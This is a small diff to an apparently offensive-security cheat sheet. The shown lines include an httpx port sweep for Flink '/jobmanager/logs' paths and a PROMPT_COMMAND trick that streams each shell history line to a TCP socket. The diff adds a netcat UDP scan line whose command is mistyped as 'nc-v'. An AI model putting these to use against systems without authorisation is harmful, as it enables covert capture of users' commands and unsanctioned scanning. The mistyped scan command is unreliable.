@@ -157,6 +157,12 @@ cat hosts | httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/lo
 
 ```PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'```
 
+## Netcat UDP Scanner:
+
+```
+nc-v -u -z <IP> <Port>
+```
+
 ## Recon for Specific Device Before Enumerating:
 
 ```
